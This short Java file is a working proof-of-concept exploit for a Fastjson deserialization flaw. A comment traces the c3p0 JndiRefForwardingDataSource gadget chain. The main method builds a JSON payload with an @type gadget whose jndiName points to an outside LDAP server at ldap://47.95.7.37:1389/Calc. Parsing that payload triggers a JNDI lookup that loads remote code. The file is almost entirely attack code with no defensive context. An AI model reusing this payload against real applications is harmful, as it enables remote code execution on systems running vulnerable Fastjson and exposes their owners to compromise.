package c3p0;

import com.alibaba.fastjson.JSON;

/**
 * com.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout(int)
 *  com.mchange.v2.c3p0.JndiRefForwardingDataSource#inner()
 *   com.mchange.v2.c3p0.JndiRefForwardingDataSource#dereference()
 *    ctx.lookup(jndiName)
 */
public class c3p0_fastjson {
    public static void main(String[] args){
//        com.mchange.v2.c3p0.JndiRefForwardingDataSource
        String poc = "{\"@type\": \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\n"+"\"jndiName\": \"ldap://47.95.7.37:1389/Calc\",\n"+"\"loginTimeout\": 0}";
        JSON.parseObject(poc);
    }
}